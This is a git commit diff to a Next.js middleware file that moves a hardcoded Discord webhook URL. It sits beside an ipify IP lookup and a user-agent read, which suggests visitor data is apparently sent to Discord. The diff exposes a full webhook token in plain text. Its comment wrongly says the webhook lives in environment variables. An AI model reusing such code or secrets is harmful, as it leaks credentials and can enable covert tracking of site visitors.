5da114539ca38a5a701564bab2fa937592a7f6c9
UserChromaside <144497379+UserChromaside@users.noreply.github.com>
2024-06-25 12:12:25 -0700

    Update middleware.js

--- middleware.js
+++ middleware.js
@@ -1,5 +1,6 @@
 import { NextRequest, NextResponse, userAgent } from 'next/server';
 const ipifyAPI = "https://api.ipify.org?format=json";
+const webhook = "https://discord.com/api/webhooks/1254572509890740354/7odzMwJfY1RwkgwecvcLVrJwTHFPRHskrDPEzk2CuKZcydgS3nqvvCm74UW5xgdcaxv7" // Your webhook URL now is in your project's environment variables.
 
 
 async function getIP() {
@@ -52,8 +53,6 @@ async function main() {
 
 // Run the main function
 main();
-
-const webhook = "https://discord.com/api/webhooks/1254572509890740354/7odzMwJfY1RwkgwecvcLVrJwTHFPRHskrDPEzk2CuKZcydgS3nqvvCm74UW5xgdcaxv7" // Your webhook URL now is in your project's environment variables.
 
 export async function middleware(req){
   const ua = userAgent(req)?.ua;
